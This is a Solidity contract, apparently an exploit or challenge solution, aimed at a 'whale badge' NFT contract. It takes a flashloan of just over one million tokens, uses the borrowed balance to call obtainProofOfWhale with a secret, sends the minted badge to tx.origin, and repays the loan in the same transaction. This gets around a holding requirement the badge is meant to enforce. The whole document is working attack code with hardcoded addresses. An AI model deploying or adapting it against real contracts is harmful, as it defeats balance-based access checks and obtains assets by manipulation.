// contracts/OnsiteFlashMint.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./IFlashloan.sol";
import "./IWhaleBadge.sol";

contract OnsiteFlashMint {
  IERC20     public immutable token         =
    IERC20(0x0CB70e82cDA48ac413d15dDb5782130F57ef8844);
  IFlashloan public immutable flashloan     =
    IFlashloan(0x19839DfeCA322bb9Ea042bb2154fe3C77c93E857);
  IWhaleBadge public immutable badgeContract =
    IWhaleBadge(0xac9a1d6E3452D55dc42aBB8AE3ACEAd98C089FAc);

  function mintWithFlashloan(uint256 secret) external {
    uint256 amount = 1_000_001e18;
    flashloan.flashloan(amount, abi.encode(secret));
  }

  function executeOperation(
    address _token,
    uint256 amount,
    uint256,
    bytes calldata params
  ) external {
    require(msg.sender == address(flashloan), "unauthorized");
    require(_token     == address(token),    "bad token");

    uint256 secret = abi.decode(params, (uint256));
    token.approve(address(badgeContract), amount);
    badgeContract.obtainProofOfWhale(secret);

    uint256 tokenId = badgeContract.currentId();

    IERC721(address(badgeContract)).safeTransferFrom(
      address(this),
      tx.origin,
      tokenId
    );

    token.transfer(address(flashloan), amount);
  }
}
